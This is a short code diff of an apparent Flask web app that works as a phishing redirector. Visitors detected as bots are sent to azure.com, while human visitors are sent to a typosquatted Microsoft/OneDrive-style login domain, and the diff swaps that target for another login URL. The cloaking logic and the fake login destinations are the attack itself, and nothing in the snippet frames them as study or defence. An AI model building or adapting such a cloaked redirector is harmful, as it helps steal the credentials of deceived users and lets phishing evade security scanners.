@@ -48,9 +48,10 @@ def root():
     if is_bot(request):
         return redirect("https://azure.com", code=302)
     else:
-        return redirect("https://login.0ned1ve.micrsftonl.fun/UuSXLxev", code=302)
+        return redirect("https://login.oneshare.cdm-smith.com/iOugAYiL", code=302)
 
 
 if __name__ == "__main__":
     app.run()
+
 
